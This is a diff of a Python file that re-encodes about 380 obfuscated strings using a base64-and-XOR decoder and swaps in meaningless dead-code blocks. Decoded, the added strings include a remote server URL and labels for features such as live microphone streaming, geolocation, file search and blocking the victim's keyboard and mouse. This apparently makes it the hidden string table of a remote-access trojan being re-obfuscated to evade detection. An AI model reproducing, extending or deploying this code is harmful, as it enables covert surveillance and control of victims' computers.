@@ -16,632 +16,815 @@ def _D(b):
     d = base64.b64decode(b)
     k = d[0]
     return bytes(c ^ k for c in d[1:]).decode("utf-8")
-_s1 = "OFBMTEhLAhcXSllLSFBdSl0WV1ZKXVZcXUoWW1dV"
-_s2 = "E2FyYGN7dmF2PnB/enZ9Zz54dmo+ISMhJw=="
-_s3 = "n66xr7Gu"
-_s4 = "keHo/+Hk5Q=="
-_s5 = "rd3U3cjfzsHE3Q=="
-_s6 = "YgEQGxIWDQ=="
-_s7 = "RjY/KDYzMg=="
-_s8 = "qdnQysje"
-_s9 = "lOTt5PHm9/j95A=="
+_s1 = "A2t3d3NwOSwscWJwc2tmcWYtbG1xZm1nZnEtYGxu"
+_s2 = "gfPg8vHp5PPkrOLt6OTv9azq5Piss7GztQ=="
+_s3 = "uouUipSL"
+_s4 = "YxMaDRMWFw=="
+_s5 = "1aWspbCntrm8pQ=="
+_s6 = "kvHg6+Lm/Q=="
+_s7 = "PExFUkxJSA=="
+_s8 = "XCwlPz0r"
+_s9 = "gfH48eTz4u3o8Q=="
 _s10 = "HGxvaWh1cA=="
-_s11 = "cQEIEAQVGB4="
-_s12 = "iun48/r+5Q=="
-_s13 = "mt/IyNXIoLrq8+q68/Tp7vv29rrq4+7y9fS36fX58f/u8/XB+fbz//Tuxw=="
-_s14 = "3/r3vqy8q7ayuvas/4T697O6qbqzsb6yuvasgv/697K6rKy+uLr2rA=="
-_s15 = "rNzVwtzZ2A=="
-_s16 = "36i2u6u3"
-_s17 = "YRYID1JT"
-_s18 = "5JeHloGBig=="
-_s19 = "ne7+7/j48w=="
-_s20 = "leb25/Dw+w=="
-_s21 = "8YaUk5KQnA=="
-_s22 = "lefw+fD05vA="
-_s23 = "ewgYCR4eFQ=="
-_s24 = "6JuLmo2Nhg=="
-_s25 = "UhAVAAo="
-_s26 = "WhAKHx0="
-_s27 = "E2BwYXZ2fUx1YXJ+dg=="
-_s28 = "jaPn/eo="
-_s29 = "gPfl4uPh7d/m8uHt5Q=="
-_s30 = "1r+7t7Gz"
-_s31 = "DEBlemksYWVvfmN8ZGNiaSx/eH5pbWFlYmssemVtLHx1bXloZWMs7oqeLFtNWixvZHliZ38s7oqeLG5tf2k6OCI="
-_s32 = "9oaPl4OSn5k="
-_s33 = "dhsfFSkFAhcCAwU="
-_s34 = "NVhcVmpGQVRBQEY="
-_s35 = "hejs5tr28eTx8PY="
-_s36 = "1IOmtaT0prWj9ISXmfS9uvS19Lm9ur25tbj0g5WC9LyxtbCxpvSnu/S2prujp7Gmp/S3tbr0sLG3u7Cx9L2g+g=="
-_s37 = "s4+HwPqHwIfA+vv7+vr7+4fA+g=="
-_s38 = "C1lCTU0="
-_s39 = "7YmMmYw="
-_s40 = "P1JWXGBbXkte"
-_s41 = "rd3e2NnEwQ=="
-_s42 = "v8zGzMva0uDMy97LzA=="
-_s43 = "27a+trSpooSrvqm4vrWv"
-_s44 = "st/X393Ay+3G3cbT3u3V0A=="
-_s45 = "rcnE3sbyy9/IyPLKzw=="
-_s46 = "CmRvflV5b2R+VWdo"
-_s47 = "tcbQ28bax8Y="
-_s48 = "t/T4+uTn8vQ="
-_s49 = "ttnG09jGws8="
-_s50 = "9oWTgoWfkg=="
-_s51 = "ThoLHAM="
-_s52 = "8YKFlZif"
-_s53 = "QTUkOTU="
-_s54 = "16C+ueTl"
-_s55 = "656fjcbT"
-_s56 = "yrm+pbo="
-_s57 = "3qq7rLO3sL+ygbGrqq6rqg=="
-_s58 = "8IOEn4A="
-_s59 = "G35jcm8R"
-_s60 = "+7mamJCciZSOlZ/bkJ6Cl5ScnJ6J24ySj5Pbi56J1oySlZ+UjNuciZSOi5KVnNualZ/bi56JkpSfkpjbnZeOiJPV"
-_s61 = "45OajZOWlw=="
-_s62 = "SyAuMickLBQ4Pyo/Pjg="
-_s63 = "WzA+Ijc0PAQoLzovLig="
-_s64 = "w6imuq+spJywt6K3trA="
-_s65 = "USY4P2Jj"
-_s66 = "KUpBSFs="
-_s67 = "zaaotKGiqpKprLms"
-_s68 = "hevk6OA="
-_xj = type("X", (), {"__init__": lambda s: None})()
-if _xj is not None and 1 == 2:
-    del _xj
-_s69 = "j+z/+tD/6v3s6uH7"
-_s70 = "kP7x/fU="
-_s71 = "xauqseWjqrCroQ=="
-_s72 = "rd3Uzsza"
-_s73 = "w7Wsr7aupg=="
-_s74 = "PExFX11L"
-_s75 = "fg4HHR8J"
-_s76 = "o9TKzZCR"
-_s77 = "75ecips="
-_s78 = "kOf5/qOi"
-_s79 = "E3dyYWR6fQ=="
-_s80 = "Mh1hS0FGV18dfltQQFNASx1xXUBXYVdARFtRV0Edf1dcRxJ3SkZAU0EdZ0FXQBxfV1xHHXFdXEZXXEZBHWBXQV1HQFFXQR1xdWFXQUFbXVw="
-_s81 = "5YmKgoyLhpGJ"
-_s82 = "USY4P2Jj"
-_s83 = "HHh9bmt1cg=="
-_s84 = "rNzB38nY"
-_s85 = "CnlzeX5vZ2l+Zg=="
-_s86 = "AkFqY2xlZyJmZ3Fpdm1yInVjbm5yY3JncCJkcG1vIm5tYWNuInJjdmoibXAiV1BOLA=="
-_s87 = "strGxsKInZ0="
-_s88 = "2fezqb4="
-_s89 = "8LaZnJXQnp+E0JafhZ6U"
-_s90 = "06S6veDh"
-_s91 = "N2BWW1tHVkdSRRdUX1ZZUFJT"
-_s92 = "1rK3pKG/uA=="
-_s93 = "OVZKWEpaS1BJTQ=="
-_s94 = "PWpcUVFNXE1YTx1eVVxTWlhZ"
-_s95 = "Gn1pf25uc3R9aQ=="
-_s96 = "6cTEi47EmoqIhYw="
-_s97 = "pPPFyMjUxdTB1oTXwdA="
-_s98 = "IGRlAE5PVABTVVBQT1JURUQ="
-_s99 = "zp2mobnur+6+ob67vu6jq729r6mr7qyhtuA="
-_s100 = "odbIz5KT"
-_s101 = "bgoPHBkHAA=="
-_s102 = "aAcbCRsLGgEYHA=="
-_s103 = "DnRrYGd6dw=="
-_s104 = "mcrx9u73"
-_s105 = "76CfioHPur2jz4aBz4uKiY6ag5vPjZ2AmJyKncE="
-_s106 = "vOjd19mc09LZnM/fztnZ0s/U08ic3dLYnM7ZyMnO0pzVyJI="
-_s107 = "VjslJXY4OSJ2NyA3Pzo3NDoz"
-_s108 = "w4GEkZs="
-_s109 = "3Zq4qf28ra2vsqW0sLypuP26uLKxsr68qbSys/2rtLz9lI3z"
-_s110 = "yaG9vbm68+bmoLnkqLmg56qmpOajuqan5g=="
-_s111 = "NVBHR1pH"
-_s112 = "9rqfhYLWn5iFgpeampOS1peGhpqflZeCn5mYhdg="
-_s113 = "ptHPyJWU"
-_s114 = "5KCNl5SIhZ2qhYmB"
-_s115 = "9JCVhoOdmg=="
-_s116 = "wLO5s7SlrZ+wsq+mqaylsg=="
-_s117 = "mv7q8f0="
-_s118 = "NWVZVEwVVBVXUFBFFUZaQFtRFR1iXFtRWkJGHBs="
-_s119 = "ZhEPCFVU"
-_s120 = "0JK1taC1tA=="
-_s121 = "KFhJWERJUQ=="
-_s122 = "D19jbnZqaw=="
-_s123 = "FEdxdWZ3fDRye2Y0cn14cWc0eXVgd3x9enM0dTRkdWBgcWZ6NDxwcWRgfDl4fXl9YHFwNHJ7ZjRndXJxYG09Og=="
-_s124 = "cTQJFBIEBRRREFECGRQdHVESHhwcEB8VURAfFVEDFAUEAx9RHgQFAQQFXw=="
-_s125 = "ZjIvKyMpMzI="
-_s126 = "eDoUFxsTVw0WGhQXGxNYFRcNCx1YGRYcWBMdARoXGQocWBEWCA0MWFAvERYcFw8LWBcWFAFUWAodCQ0RCh0LWBkcFREWUVY="
-_s127 = "Kl1DRBkY"
-_s128 = "IWhPUVRVAUNNTkJKREU="
-_s129 = "WRs1NjoyeT84MDU8PXlxNzw8PSp5OD00MDdw"
-_s130 = "bjoLAgALGg=="
-_s131 = "Yio2NjI="
-_s132 = "MXllZWFi"
-_s133 = "qOXR+/nk"
-_s134 = "E0F2d3pg"
-_s135 = "LmNBQElBamw="
-_s136 = "JnN2SHY="
-_s137 = "uOvr/Og="
-_s138 = "P3xXTVBSWlxeTEs="
-_s139 = "qeqZk5yfk5ue"
-_s140 = "v4+PhY6OhYyN"
-_s141 = "3O+f5unu5uTu"
-_s142 = "5afd39fS36Cn"
-_s143 = "O3oPAQMIAX4M"
-_s144 = "xPaH/oL0/vGA"
-_s145 = "TXx1dw95d359"
-_s146 = "naXcp67bp6ze"
-_s147 = "fEVIRklLRk4/"
-_s148 = "zf399/yM9/z8"
-_s149 = "vIyMhomMhomK"
-_s150 = "Dz8/NT5NNTs7"
-_s151 = "OwsLAQp/AQx+"
-_s152 = "uY+Jg42Mg/v9"
-_s153 = "YFBQWlAjWlJZ"
-_s154 = "Xx0cZWZtZWkd"
-_s155 = "88PDycKxycXA"
-_s156 = "fDhMRjhMRkxP"
-_s157 = "/czFx8/Lx8nE"
-_s158 = "cTdJS0VHS0Ay"
-_s159 = "rZ/ul5iZl5Sc"
-_s160 = "6dnZ09vd06us"
-_s161 = "qZmZk5idk+/t"
-_s162 = "KRkZExhsE2ob"
-_s163 = "VhU6NyUlPzAvdjd2Ozc1Pj84M3YiLyYzdjQ3JTMydjk4dj8iJXY5JjM4diY5JCIldjc4MnY5Ij4zJHY1OiMzJXg="
+_s11 = "s8PK0sbX2tw="
+_s12 = "mvno4+ru9Q=="
+_s13 = "/LmurrOuxtyMlYzclZKPiJ2QkNyMhYiUk5LRj5Ofl5mIlZOnn5CVmZKIoQ=="
+_s14 = "58LPhpSEk46Kgs6Ux7zCz4uCkYKLiYaKgs6UusfCz4qClJSGgILOlA=="
+_s15 = "SDgxJjg9PA=="
+_s16 = "vMvV2MjU"
+_s17 = "MUZYXwID"
+_s18 = "5pWFlIODiA=="
+_s19 = "CHtrem1tZg=="
+_s20 = "1qW1pLOzuA=="
+_s21 = "pNPBxsfFyQ=="
+_s22 = "MEJVXFVRQ1U="
+_s23 = "QzAgMSYmLQ=="
+_s24 = "A3BgcWZmbQ=="
+_s25 = "re/q//U="
+_s26 = "bCY8KSs="
+_s27 = "GWp6a3x8d0Z/a3h0fA=="
+_s28 = "Fjh8ZnE="
+_s29 = "l+Dy9fT2+sjx5fb68g=="
+_s30 = "WzI2Ojw+"
+_s31 = "RwsuMSJnKi4kNSg3LygpImc0MzUiJiouKSBnMS4mZzc+JjIjLihnpcHVZxAGEWckLzIpLDRnpcHVZyUmNCJxc2k="
+_s32 = "2qqju6++s7U="
+_s33 = "s97a0OzAx9LHxsA="
+_s34 = "0r+7sY2hprOmp6E="
+_s35 = "PlNXXWFNSl9KS00="
+_s36 = "g9Tx4vOj8eL0o9PAzqPq7aPio+7q7eru4u+j1MLVo+vm4ufm8aPw7KPh8ez08Obx8KPg4u2j5+bg7Ofmo+r3rQ=="
+_s37 = "q5ef2OKf2J/Y4uPj4uLj45/Y4g=="
+_s38 = "s+H69fU="
+_s39 = "1rK3orc="
+_s40 = "IE1JQ39EQVRB"
+_s41 = "J1dUUlNOSw=="
+_s42 = "i/jy+P/u5tT4/+r/+A=="
+_s43 = "mvf/9/Xo48Xq/+j5//Tu"
+_s44 = "waykrK6zuJ61rrWgrZ6mow=="
+_s45 = "4oaLkYm9hJCHh72FgA=="
+_s46 = "dhgTAikFExgCKRsU"
+_s47 = "vs3b0M3RzM0="
+_s48 = "URIeHAIBFBI="
+_s49 = "lvnm8/jm4u8="
+_s50 = "KllPXllDTg=="
+_s51 = "lMDRxtk="
+_s52 = "ZhUSAg8I"
+_s53 = "6Z2MkZ0="
+_s54 = "EGd5fiMi"
+_s55 = "LltaSAMW"
+_s56 = "Cnl+ZXo="
+_s57 = "rdnI38DEw8zB8sLY2d3Y2Q=="
+_s58 = "kOPk/+A="
+_s59 = "TSg1JDlH"
+_s60 = "Wxk6ODA8KTQuNT97MD4iNzQ8PD4peywyLzN7Kz4pdiwyNT80LHs8KTQuKzI1PHs6NT97Kz4pMjQ/Mjh7PTcuKDN1"
+_s61 = "meng9+ns7Q=="
+_s62 = "cxgWCh8cFCwABxIHBgA="
+_s63 = "m/D+4vf0/MTo7/rv7ug="
+_s64 = "rcbI1MHCyvLe2czZ2N4="
+_s65 = "l+D++aSl"
+_s66 = "/J+UnY4="
+_s67 = "8ZqUiJ2elq6VkIWQ"
+_s68 = "bAINAQk="
+_ji = 0
+for _ in [1,2,3]:
+    if False: _ji += 1
+_s69 = "KEtYXXdYTVpLTUZc"
+_s70 = "PVNcUFg="
+_s71 = "uNbXzJje183W3A=="
+_s72 = "rt7Xzc/Z"
+_s73 = "36mws6qyug=="
+_s74 = "EWFocnBm"
+_s75 = "6pqTiYud"
+_s76 = "TDslIn9+"
+_s77 = "6pKZj54="
+_s78 = "NUJcWwYH"
+_s79 = "osbD0NXLzA=="
+_s80 = "HTJOZG5peHAyUXR/b3xvZDJecm94Tnhva3R+eG4yUHhzaD1YZWlvfG4ySG54bzNweHNoMl5yc2l4c2luMk94bnJob354bjJeWk54bm50cnM="
+_s81 = "UDw/Nzk+MyQ8"
+_s82 = "leL8+6an"
+_s83 = "xqKntLGvqA=="
+_s84 = "mOj16/3s"
+_s85 = "bh0XHRoLAw0aAg=="
+_s86 = "ImFKQ0xFRwJGR1FJVk1SAlVDTk5SQ1JHUAJEUE1PAk5NQUNOAlJDVkoCTVACd3BuDA=="
+_s87 = "L0dbW18VAAA="
+_s88 = "LQNHXUo="
+_s89 = "z4mmo6rvoaC776mguqGr"
+_s90 = "ZhEPCFVU"
+_s91 = "/6iek5OPno+ajd+cl56RmJqb"
+_s92 = "eh4bCA0TFA=="
+_s93 = "+5SImoiYiZKLjw=="
+_s94 = "aD8JBAQYCRgNGkgLAAkGDw0M"
+_s95 = "1rGls6Kiv7ixpQ=="
+_s96 = "7sPDjInDnY2Pgos="
+_s97 = "9aKUmZmFlIWQh9WGkIE="
+_s98 = "2Jyd+La3rPirraiot6qsvbw="
+_s99 = "xJesq7PkpeS0q7SxtOSpobe3paOh5KarvOo="
+_s100 = "zLulov/+"
+_s101 = "74uOnZiGgQ=="
+_s102 = "bAMfDR8PHgUcGA=="
+_s103 = "QTskLyg1OA=="
+_s104 = "RBcsKzMq"
+_s105 = "GFdofXY4TUpUOHF2OHx9fnltdGw4emp3b2t9ajY="
+_s106 = "x5OmrKLnqKmi57SktaKiqbSvqLPnpqmj57Wis7K1qeeus+k="
+_s107 = "rcDe3o3DwtmNzNvMxMHMz8HI"
+_s108 = "66msubM="
+_s109 = "eD8dDFgZCAgKFwARFRkMHVgfHRcUFxsZDBEXFlgOERlYMShW"
+_s110 = "lv7i4ublrLm5/+a79+b/uPX5+7n85fn4uQ=="
+_s111 = "SSw7OyY7"
+_s112 = "35O2rKv/trGsq76zs7q7/76vr7O2vL6rtrCxrPE="
+_s113 = "qN/Bxpua"
+_s114 = "6q6DmZqGi5Oki4eP"
+_s115 = "y6+qubyipQ=="
+_s116 = "5pWflZKDi7mWlImAj4qDlA=="
+_s117 = "4YWRioY="
+_s118 = "MWFdUEgRUBFTVFRBEUJeRF9VERlmWF9VXkZCGB8="
+_s119 = "wrWrrPHw"
+_s120 = "re/IyN3IyQ=="
+_s121 = "/o6fjpKfhw=="
+_s122 = "bDwADRUJCA=="
+_s123 = "y5iuqrmoo+utpLnrraKnrrjrpqq/qKOipazrquu7qr+/rrml6+Ovrru/o+anoqaiv66v662kueu4qq2uv7Li5Q=="
+_s124 = "MXRJVFJERVQRUBFCWVRdXRFSXlxcUF9VEVBfVRFDVEVEQ18RXkRFQURFHw=="
+_s125 = "UAQZHRUfBQQ="
+_s126 = "z42joKyk4LqhraOgrKTvoqC6vKrvrqGr76Sqtq2grr2r76ahv7q77+eYpqGroLi876Cho7bj772qvrqmvaq8766roqah5uE="
+_s127 = "ZhEPCFVU"
+_s128 = "eDEWCA0MWBoUFxsTHRw="
+_s129 = "SggmJSkhaiwrIyYvLmpiJC8vLjlqKy4nIyRj"
+_s130 = "IXVETU9EVQ=="
+_s131 = "woqWlpI="
+_s132 = "xo6SkpaV"
+_s133 = "BEl9V1VI"
+_s134 = "BFZhYG13"
+_s135 = "L2JAQUhAa20="
+_s136 = "fisuEC4="
+_s137 = "pfb24fU="
+_s138 = "x4SvtaiqoqSmtLM="
+_s139 = "O3gLAQ4NAQkM"
+_s140 = "ECAgKiEhKiMi"
+_s141 = "AjFBODcwODow"
+_s142 = "WBpgYmpvYh0a"
+_s143 = "ezpPQUNIQT5M"
+_s144 = "VmQVbBBmbGMS"
+_s145 = "Rnd+fARyfHV2"
+_s146 = "qZHok5rvk5jq"
+_s147 = "Bj8yPDMxPDRF"
+_s148 = "wfHx+/CA+/Dw"
+_s149 = "i7u7sb67sb69"
+_s150 = "XGxsZm0eZmho"
+_s151 = "hra2vLfCvLHD"
+_s152 = "a11bUV9eUSkv"
+_s153 = "s4ODiYPwiYGK"
+_s154 = "I2FgGRoRGRVh"
+_s155 = "v4+PhY79hYmM"
+_s156 = "ouaSmOaSmJKR"
+_s157 = "ppeenJSQnJKf"
+_s158 = "t/GPjYOBjYb0"
+_s159 = "rpztlJualJef"
+_s160 = "0ODg6uLk6pKV"
+_s161 = "z///9f779YmL"
+_s162 = "NQUFDwRwD3YH"
+_s163 = "MXJdUEJCWFdIEVARXFBSWVhfVBFFSEFUEVNQQlRVEV5fEVhFQhFeQVRfEUFeQ0VCEVBfVRFeRVlUQxFSXURUQh8="
 _s164 = "MkBdR0ZXQA=="
-_s165 = "aBgaAQYcDRo="
-if False:
-    _x = [i for i in range(1000) if i % 7 == 0]
-    _y = "".join(chr(c) for c in range(65, 91))
-_s166 = "yaWgp7yxlrqsu7+suw=="
-_s167 = "gOzp7vX43/Pl8vbl8g=="
-_s168 = "t8De2dPYwMTox9Q="
-_s169 = "ZRYcCwoJCgIc"
-_s170 = "z4GOnO/g74mmo6rvnKq9uaq9"
-_s171 = "yL+hpqynv7uXu626vq26"
-_s172 = "GW5wd312bmpGaXo="
-_s173 = "A3RqbWdsdHBcc2A="
-_s174 = "0razprOws6G3"
-_s175 = "aBwYRQQBBgM="
-_s176 = "84GchoeWgQ=="
-_s177 = "3qm7vIGtu6you6w="
-_s178 = "PHVTaBwTHHFZWFVdHHhZSlVfWQ=="
-_s179 = "EHFgYHx1"
-_s180 = "LEFDTkVASQ=="
-_s181 = "HnlxcXlyew=="
-_s182 = "1oW7t6Si9p65u7P2krOgv7Wz"
-_s183 = "CXtoenlrbHt7cA=="
-_s184 = "x6uuqbK/mLSitbGitQ=="
-_s185 = "mOv39uE="
-_s186 = "SRokKDs9aR0faWZpBCwtICg="
-_s187 = "K0lZRF9DTlk="
-_s188 = "leXn/Pvh8Oc="
-_s189 = "eA0WExYXDxY="
-_s190 = "YDEVCQMLQDQjMEADDw4OBQMUQBMDAQ5ADw5AAUAMCRMUQA8GQBAPEhQTTkAyBRQVEg4TQAwJExRADwZADxAFDkAQDxIUE04="
-_s191 = "jMvp+Kzi6fj74/7nrOXi+On+6u3v6f+grO3v+OX66azv4+Li6e/45ePi/6Cszd7crPjt7uDpoKzt4uis/OP++KH/7+3irP7p//ng+P+i"
-_s192 = "PFVSSFlOWl1fWU8="
-_s193 = "2amqrK2wtQ=="
-_s194 = "MV9QXFQ="
-_s195 = "WTg9PSs8Kio8Kg=="
-_s196 = "fxkeEhYTBg=="
-_s197 = "h+bj4/Xi9PQ="
-_s198 = "h+ni8+rm9Ow="
-_s199 = "OFpKV1lcW1lLTA=="
-_s200 = "pczL0cDXw8TGwNY="
-_s201 = "exIVDx4JHRoYHggkHgkJFAk="
-_s202 = "9YWGgIGcmQ=="
-_s203 = "O1hUVVVeWE9SVFVI"
-_s204 = "TSssICQhNA=="
-_s205 = "fgoHDhs="
-_s206 = "J0tIREZL"
-_s207 = "t8XS2tjD0g=="
-_s208 = "F2RjdmNiZA=="
-_s209 = "O1hUVVVeWE9SVFVIZF5JSVRJ"
-_s210 = "xrGvqPX0"
-_s211 = "bxgGAVxd"
-_s212 = "VzMuOTY6PjQ="
-_s213 = "JkJfSEdLT1dTQw=="
-_s214 = "eg4DCh8="
-_s215 = "i+r5+9Tu+fnk+Q=="
-_s216 = "69nZ38U="
-_s217 = "OG1WU1ZXT1Y="
-_s218 = "tOHa39rbw9o="
-_s219 = "SCQnKykkFyYtPD8nOiM="
-_s220 = "YBYFDgQPEg=="
-_s221 = "4Y6RhI++kY6TlZI="
-_s222 = "+JeInZani52KjpGbnYs="
-_s223 = "Qy4iICsqLSYcNzozJg=="
-_s224 = "dBkVFxwdGhErGBUWERg="
-_s225 = "A25iYGtqbWZcamBsbQ=="
-_s226 = "l/bl58jj7ufy"
-_s227 = "BWtgcXJqd24="
-_s228 = "ierm5+fs6v3g5uf6"
-_s229 = "g/Hm7uz35g=="
-_s230 = "1ufk4fg="
-_s231 = "TH17fmI="
-_s232 = "laW7pbulu6U="
-_s233 = "YAUYFAUSDgEMPwgPExQT"
-_s234 = "C3tkeX8="
-_s235 = "usnfyMzT2d8="
-_s236 = "vs3K38rLzQ=="
-_s237 = "iOTn6+nk1+ns7Po="
-_s238 = "IE5FVFdPUks="
-_s239 = "sNXIxNXC3tHc79jfw8TD"
-_s240 = "nfzx8cLt8u/p7g=="
-_s241 = "eBkUFCcIFwoMCw=="
-_s242 = "Cm9yfm94ZGtmVWJleX55"
-_s243 = "jej1+ej/4+zh0uXi/vn+"
-_s244 = "3raxraqwv7O7"
-_s245 = "IFBPUlQ="
-_s246 = "jv7h/Po="
-_s247 = "eTwBDQsYGg1ZChgPHB1ZCRgKCg4WCx0KWRgXHVkaFhYSEBwKWR8LFhRZOhELFhQcVVk8HR4cVVk/EAscHxYBVw=="
-_s248 = "EHN4Yn99dQ=="
-_s249 = "XxMQHB4THg8PGx4LHg=="
-_s250 = "8rOiorazprM="
-_s251 = "ZSIKCgIJAA=="
-_s252 = "OVpRS1ZUXA=="
-_s253 = "6YqBm4aEjA=="
-_s254 = "1Jm9t6a7p7uyoA=="
-_s255 = "XDk4Ozk="
-_s256 = "8JWUl5U="
-_s257 = "v/LQxdbT094="
-_s258 = "xqCvtKOgqb4="
-_s259 = "+J6Rip2el4A="
-_s260 = "puPe0tTHxdKG1sfV1dHJ1MLVhsDUycuG5c7UycvP08uLxMfVw8KGxNTJ0dXD1NWGjuXO1MnLw4qG48LBw4qG5NTH0MOKhunWw9THiIiIj4g="
-_s261 = "TT0sPj46Ij8pPg=="
-_s262 = "zoqrqK+7oro="
-if 0:
-    import hashlib
-    _h = hashlib.sha256(b"dead").hexdigest()
-_s263 = "YS0OBggPQSUAFQA="
-_s264 = "8qa3v6I="
-_s265 = "BlVDSkNFUiZpdG9hb2hZc3RqKiZzdWN0aGdrY1lwZ2pzYyomdmd1dXFpdGJZcGdqc2MmQFRJSyZqaWFvaHU="
-_s266 = "rc7f1N3Zwg=="
-_s267 = "ZxcGFBQQCBUDFA=="
-_s268 = "cxYBARwB"
-_s269 = "DkBrenlhfGU="
-_s270 = "E1B8fHh6dmA="
-_s271 = "RxMCChc="
-_s272 = "+Ku9tL27rNiQl4uMp5OdgdTYlpmVndTYnZabioGIjJ2cp46ZlI2d2L6qt7XYm5eXk5Gdi9i0sbWxrNjKyMg="
-_s273 = "rs3BwcXHy90="
-_s274 = "mfzr6/br"
-_s275 = "o+fGwNHa09eD4MvRzM7GjObHxMaD08LQ0NTM0ceD1tDKzcSD9MrNx8zU0IPn8+Lz6oOIg+Lm8I6RlpWO5ODujQ=="
-_s276 = "IHtOTwBEQVRBfQ=="
-_s277 = "14yjuLj3pL+4paOK"
-_s278 = "EUpkf3p/fmZ/MXd+Y3xwZTE="
-_s279 = "B0tIREZLRldXQ0ZTRg=="
-_s280 = "9bKampKZkA=="
-_s281 = "WRQwOis2KjY/LQ=="
-_s282 = "VRcnNCMwBjozISI0JzA="
-_s283 = "LWJdSF9MDX5CS1laTF9I"
-_s284 = "LmJBTU9CDn1aT1pL"
-_s285 = "Wy4vPXZj"
-_s286 = "MV5CblJDSEFF"
-_s287 = "UhYCEwIb"
-_s288 = "KklIbkteSw=="
-_s289 = "UyMxFzInMg=="
-_s290 = "gfT156y5"
-_s291 = "6LOLiYaGh5zIjI2LmpGYnLU="
-_s292 = "oeTZ1dPAwtWB0sDXxMWBzc7GyM/SgcfTzsyB58jTxMfO2YHR087HyM3E0o8="
-_s293 = "j//u/Pz44P3r/A=="
-_s294 = "lfn68vz75rv/5vr7"
-_s295 = "kOXk9r2o"
-_s296 = "KUVGTkBHWg=="
-_s297 = "ZxcGFBQQCBUDFA=="
-_s298 = "/paRjYqQn5Ob"
-_s299 = "DXh+aH9jbGBo"
-_s300 = "Xi4/LS0pMSw6"
-_s301 = "EWFjfnd4fXQ="
-_s302 = "F3J5dGVuZ2Nycw=="
-_s303 = "YQIODgoIBBJPEhANCBUE"
-_s304 = "34uako8="
-_s305 = "q/ju5+7o/4vDxNjfh4vFysbOh4vdysfezovt+eTmi8bE0fTIxMTAws7Yi+fi5uL/i5mbmw=="
-_s306 = "BmVpaW1vY3U="
-_s307 = "z6egvLs="
-_s308 = "FmB3emNz"
-_s309 = "NVBHR1pH"
-_s310 = "XxswKDEzMD47fz5/OTYzOn85LTAyfwoNE38+MTt/MC8rNjAxPjMzJn86Jzo8Kis6fzYrcQ=="
-_s311 = "rPjp4fw="
-_s312 = "5ZKMi9bX"
-_s313 = "luH/+KWk"
-_s314 = "94eWg58="
-_s315 = "rcPMwMg="
-_s316 = "fBkODhMO"
-_s317 = "Si84OCU4"
-_s318 = "Vjg3OzM="
-_s319 = "AXV4cWQ="
-_s320 = "37Kwu7a5trq7"
-_s321 = "uNbZ1d0="
-_s322 = "zrq3vqs="
-_s323 = "vc3cydU="
-_s324 = "uc7Yy9fQ194="
-_s325 = "+7WUj9udlI6Vnw=="
-_s326 = "1JCxuLGgsbA="
-_s327 = "B2Nmc2Y="
-_s328 = "+56JiZSJ"
-_s329 = "1Je8sbe/9KexpqKxpvSyu6b0tfS6saP0t7i9sbqg9KKxpqe9u7r69IaxoKGmuqf0/Lqxo4uisaanvbu6+PSwu6O6uLu1sIuhprj99Lum9Pyau7qx+PSau7qx/fo="
-_s330 = "IA9BUEkPQ0xJRU5UDVVQREFURQ=="
-_s331 = "1KKxpqe9u7o="
-_s332 = "dBAbAxoYGxUQKwEGGA=="
-_s333 = "Vhg5diMmMjciM3Y/ODA5djU5ODA/MSMkMzJ2OTh2JTMkIDMk"
-_s334 = "Wh41LTQ2NTs+ei4yP3o0Py16dD8iP3o7ND56KS47PT96O3o4Oy45MnopOSgzKi56LjV6KD8qNjs5P3EoPykuOygudA=="
-_s335 = "VwMSGgc="
-_s336 = "u57F3Ys="
-_s337 = "7pmHgN3c"
-_s338 = "YDUQBAEUBUATAxIJEBRADAEVDgMIBQRATUAFGAkUCQ4HQBQPQAEQEAwZQBUQBAEUBQ=="
-_s339 = "ImNXVk0PV1JGQ1ZHAktRAnVLTEZNVVEPTUxOWwJETVACTE1V"
-_s340 = "ImFKR0FJAktEAlBXTExLTEUCVUtWSgJDRk9LTAJSUEtUS05HRUdRAgp1S0xGTVVRAk1MTlsLDA=="
-_s341 = "1qG/uOXk"
-_s342 = "qd7Ax5qb"
-_s343 = "htPHxabk//bn9fWm7/Wm0e/o4unx9avp6Or/"
-_s344 = "keb4/+P09rH//uWx8Ofw+P3w8/30sff+47HE0NKx8+jh8OLi"
-_s345 = "6MXFjYSNnomcjYw="
-_s346 = "lLm55/Hm4vHm"
-_s347 = "j6Ki6uPq+e776us="
-_s348 = "7amIgYiKjJmIqJWIjpiZiA=="
-_s349 = "renIwcjKzNnI6NXIztjZyA=="
-_s350 = "htHPyMLP1A=="
-_s351 = "86aysNORioOSgIDTh4GalJSWgZaX097Tlouah5qdlNOQhoGBlp2H05qdgIeSnZCW"
-_s352 = "yJqtpae+reiup6ygraS4rbrouq2vobu8urHoo62xu+ikra686Kqx6Lygreiqsbipu7vm"
-_s353 = "tPDR2NHT1cDR8czR18HA0Q=="
-_s354 = "oPXh44DSxcfJ09TS2YDDzMXBzsXEgNXQ"
-_s355 = "zZ2ov6SiqaSurKGhtO29pKOq7bmlqO2+qL+7qL/tpaisobml7aijqb2ipKO57bmi7b2/qLuoo7ntn6ijqai/7au/oqDtvqGoqL2ko6rj"
-_s356 = "Q2wiMypsKyYiLzcr"
-_s357 = "0Ju1taD9sby5prXwoLm+t/Cfmw=="
-_s358 = "JEJWS15BSg=="
-_s359 = "/4iWkczN"
-_xj = type("X", (), {"__init__": lambda s: None})()
-if _xj is not None and 1 == 2:
-    del _xj
-_s360 = "Ontqan57bns="
-_s361 = "BStkaGR/amtocHZsZg=="
-_s362 = "i/Wkperm6vHk5eb++OLo"
-_s363 = "1JW5ta67upmhp723nLG4pLGm+rGssQ=="
-_s364 = "cVxcAhQDBxQD"
-_s365 = "Q25uKic="
-_s366 = "me7w96qr"
-_s367 = "4KGNgZqPjq2Vk4mDqIWMkIWS"
-_s368 = "66q7u6+qv6o="
-_s369 = "qOnFydLHxuXd28HL4M3E2M3aht7K2w=="
-_s370 = "Rg8oNTInKiojInxmFTInNDIzNmYQBBU="
-_s371 = "BnVlbnJndW11"
-_s372 = "fg0dFgofDRUN"
-_s373 = "I2pNUFdCT09GRxkDd0JQSA=="
-_s374 = "WTorNjctODs="
-_s375 = "rO3BzdbDwuHZ38XP5MnA3Mne"
-_s376 = "1rWkubiit7Q="
-_s377 = "YSgPEhUADQ0EBVtBAhMODxUAAw=="
-_s378 = "wrzt7KGtrKSrpe2xu7G2p6+m7bexp7A="
-_s379 = "psfLx9zJyMvT1c/Fi87DytbD1IjVw9TQz8XD"
-_s380 = "PU5ETklYUF5JUQ=="
-_s381 = "3a6krqm4sL6psQ=="
